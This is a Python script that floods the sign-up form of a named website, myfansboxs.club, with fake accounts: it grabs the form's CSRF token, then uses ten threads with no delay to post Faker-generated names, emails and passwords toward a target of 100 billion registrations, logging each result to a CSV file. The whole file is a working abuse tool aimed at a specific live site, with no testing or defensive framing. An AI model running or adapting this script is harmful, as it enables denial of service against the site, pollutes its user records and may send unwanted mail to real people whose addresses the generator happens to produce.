import requests
from bs4 import BeautifulSoup
from faker import Faker
import random
from colorama import Fore, Style, init
import csv
import time
from concurrent.futures import ThreadPoolExecutor

# Initialize colorama
init(autoreset=True)
fake = Faker()

BASE_URL = "https://myfansboxs.club/"
OUTPUT_FILE = "created_accounts.csv"
REQUEST_LIMIT = 100000000000  # Number of accounts to create
THREADS = 10  # Number of threads for parallel creation
DELAY = 0  # Delay between requests (per thread)

session = requests.Session()

# Get CSRF token
html = session.get(BASE_URL).text
soup = BeautifulSoup(html, "html.parser")
csrf_token = soup.find("input", {"name": "_token"})["value"]

# CSV File Setup
csv_file = open(OUTPUT_FILE, "w", newline="", encoding="utf-8")
writer = csv.writer(csv_file)
writer.writerow(["Name", "Email", "Password", "Status"])

def create_account(i):
    name = fake.name()
    email = fake.email()
    password = fake.password(length=10)

    data = {
        "_token": csrf_token,
        "return": "https://https://myfansboxs.club/",
        "agree_gdpr": "on",
        "country": "99",
        "name": name,
        "email": email,
        "password": password,
        "password_confirmation": password,
    }

    try:
        response = session.post("https://myfansboxs.club/signup", data=data)
        if response.status_code == 200:
            print(f"{Fore.GREEN}✅ [Account {i}] {name} | {email} | Password: {password}")
            writer.writerow([name, email, password, "Success"])
        else:
            print(f"{Fore.RED}❌ [Account {i}] {name} | {email} | Status: {response.status_code}")
            writer.writerow([name, email, password, "Failed"])
    except Exception as e:
        print(f"{Fore.RED}❌ Error creating account {i}: {e}{Style.RESET_ALL}")
        writer.writerow([name, email, password, "Error"])

    time.sleep(DELAY)

# Use ThreadPoolExecutor for speed
with ThreadPoolExecutor(max_workers=THREADS) as executor:
    executor.map(create_account, range(1, REQUEST_LIMIT + 1))

csv_file.close()
print(f"{Fore.CYAN}\n--- ALL ACCOUNTS CREATED ---")
